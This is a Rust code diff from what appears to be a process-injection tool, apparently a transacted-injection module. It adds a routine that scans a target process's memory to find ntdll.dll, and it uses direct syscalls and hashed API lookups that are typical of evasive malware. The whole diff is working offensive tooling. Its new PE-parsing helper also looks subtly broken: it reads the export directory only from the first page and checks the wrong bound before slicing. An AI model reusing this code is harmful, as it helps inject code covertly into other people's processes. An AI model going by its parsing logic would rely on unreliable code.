@@ -523,14 +523,7 @@ unsafe fn find_remote_ntdll(process_handle: usize) -> Result<usize, String> {
         .ok_or("cannot resolve local ntdll")?;
 
     // Verify it's actually mapped in the target at the same address by
-    // querying the target's memory information.
-    let mut base_addr: usize = local_ntdll;
-    let mut region_size: usize = 0x1000;
-    let mut old_prot: u32 = 0;
-
-    // Use NtQueryVirtualMemory to verify the mapping exists in the target.
-    // Simpler approach: just try to read the MZ header from the target at the
-    // expected address.
+    // reading the MZ header from the target at the expected address.
     let mut buf = [0u8; 2];
     let mut bytes_read: usize = 0;
     let read_status = crate::syscall!(
@@ -546,9 +539,181 @@ unsafe fn find_remote_ntdll(process_handle: usize) -> Result<usize, String> {
         return Ok(local_ntdll);
     }
 
-    // Fallback: scan memory regions. This is slower but more reliable when
-    // the target has a different ntdll base (unusual but possible).
-    Err("could not locate ntdll in target process".to_string())
+    // Fallback: scan the target's virtual memory for an image mapping whose
+    // export directory name is "ntdll.dll".  This is needed when the target
+    // process has ntdll at a different base (unusual but possible, e.g.
+    // KnownDlls bypass or custom loader).  HIGH-012 fix.
+    scan_remote_for_ntdll(process_handle)
+}
+
+/// Walk the target process's virtual address space looking for ntdll.dll.
+///
+/// For each committed image-backed region, read the PE export directory
+/// name and compare it against "ntdll.dll".
+unsafe fn scan_remote_for_ntdll(process_handle: usize) -> Result<usize, String> {
+    use core::mem::MaybeUninit;
+
+    // Resolve NtQueryVirtualMemory from local ntdll.
+    let local_ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
+        .ok_or("cannot resolve local ntdll for NtQueryVirtualMemory")?;
+    let ntqvm_addr = pe_resolve::get_proc_address_by_hash(
+        local_ntdll,
+        pe_resolve::hash_str(b"NtQueryVirtualMemory\0"),
+    )
+    .ok_or("cannot resolve NtQueryVirtualMemory")?;
+
+    if ntqvm_addr % 8 != 0 {
+        return Err("NtQueryVirtualMemory address not aligned".to_string());
+    }
+
+    let nt_query_vm: extern "system" fn(
+        process_handle: usize,
+        base_address: *mut core::ffi::c_void,
+        memory_information_class: u32,
+        memory_information: *mut core::ffi::c_void,
+        memory_information_length: usize,
+        return_length: *mut usize,
+    ) -> i32 = core::mem::transmute(ntqvm_addr);
+
+    // MEMORY_BASIC_INFORMATION (subset).
+    #[repr(C)]
+    struct Mbi {
+        base_address: usize,
+        allocation_base: usize,
+        allocation_protect: u32,
+        region_size: usize,
+        state: u32,
+        protect: u32,
+        type_: u32,
+    }
+
+    const MEM_COMMIT: u32 = 0x1000;
+    const MEM_IMAGE: u32 = 0x1000000;
+
+    let mut addr: usize = 0;
+
+    loop {
+        let mut mbi: Mbi = core::mem::zeroed();
+        let mut ret_len: usize = 0;
+        let status = nt_query_vm(
+            process_handle,
+            addr as *mut core::ffi::c_void,
+            0, // MemoryBasicInformation
+            &mut mbi as *mut _ as *mut core::ffi::c_void,
+            core::mem::size_of::<Mbi>(),
+            &mut ret_len,
+        );
+        if status != 0 {
+            break;
+        }
+        if mbi.region_size == 0 {
+            break;
+        }
+
+        let next_addr = match mbi.base_address.checked_add(mbi.region_size) {
+            Some(a) => a,
+            None => break,
+        };
+
+        // Only scan committed, image-backed regions.
+        if mbi.state == MEM_COMMIT && mbi.type_ == MEM_IMAGE {
+            // Read the first page to check MZ header + PE export dir name.
+            let mut header = [0u8; 0x1000];
+            let mut bytes_read: usize = 0;
+            let rs = crate::syscall!(
+                "NtReadVirtualMemory",
+                process_handle as u64,
+                mbi.base_address as u64,
+                header.as_mut_ptr() as u64,
+                0x1000u64,
+                &mut bytes_read as *mut _ as u64,
+            );
+            if rs.as_ref().map_or(false, |s| *s >= 0) && bytes_read >= 0x200 {
+                if header[0] == b'M' && header[1] == b'Z' {
+                    // Check if this image's export directory name is ntdll.dll.
+                    if let Some(true) = check_export_dir_name_ntdll(&header) {
+                        tracing::info!(
+                            "injection_transacted: found ntdll in target at {:#x} via memory scan",
+                            mbi.base_address
+                        );
+                        return Ok(mbi.base_address);
+                    }
+                }
+            }
+        }
+
+        addr = next_addr;
+    }
+
+    Err("could not locate ntdll in target process via memory scan".to_string())
+}
+
+/// Check whether the PE header in `header_buf` (at least 0x200 bytes)
+/// has an export directory whose name is "ntdll.dll" (case-insensitive).
+fn check_export_dir_name_ntdll(header: &[u8]) -> Option<bool> {
+    if header.len() < 0x200 {
+        return None;
+    }
+
+    // Read e_lfanew (offset 0x3C).
+    let e_lfanew = u32::from_le_bytes(header[0x3C..0x40].try_into().ok()?) as usize;
+    if e_lfanew == 0 || e_lfanew + 0x78 > header.len() {
+        return None;
+    }
+
+    // Optional header offset = e_lfanew + 0x18
+    let opt_off = e_lfanew + 0x18;
+
+    // Data directory offset: export directory is the first entry (index 0).
+    // In PE32+ (64-bit), data directories start at offset 0x70 from the
+    // start of the optional header.
+    let dd_off = opt_off + 0x70;
+    if dd_off + 8 > header.len() {
+        return None;
+    }
+
+    let export_rva = u32::from_le_bytes(header[dd_off..dd_off + 4].try_into().ok()?) as usize;
+    let export_size = u32::from_le_bytes(header[dd_off + 4..dd_off + 8].try_into().ok()?) as usize;
+
+    if export_rva == 0 || export_size == 0 {
+        return Some(false); // No export directory.
+    }
+
+    // The export directory starts with characteristics (4), timestamp (4),
+    // version (4+4), name RVA (4).  Name RVA is at offset +12.
+    let name_rva_off = export_rva + 12;
+    if name_rva_off + 4 > header.len() {
+        return None;
+    }
+
+    let name_rva =
+        u32::from_le_bytes(header[name_rva_off..name_rva_off + 4].try_into().ok()?) as usize;
+    if name_rva == 0 || name_rva_off >= header.len() {
+        return None;
+    }
+
+    // The name is a null-terminated ASCII string at `name_rva`.
+    let name_end = (name_rva + 12).min(header.len());
+    let name_bytes = &header[name_rva..name_end];
+
+    // Find null terminator.
+    let name_str = match name_bytes.iter().position(|&b| b == 0) {
+        Some(pos) => &name_bytes[..pos],
+        None => name_bytes,
+    };
+
+    // Compare case-insensitively with "ntdll.dll".
+    const NTDLL_NAME: &[u8] = b"ntdll.dll";
+    if name_str.len() != NTDLL_NAME.len() {
+        return Some(false);
+    }
+
+    let matches = name_str
+        .iter()
+        .zip(NTDLL_NAME.iter())
+        .all(|(a, b)| a.to_ascii_lowercase() == *b);
+
+    Some(matches)
 }
 
 /// Maximum recursion depth for forwarded-export resolution across process
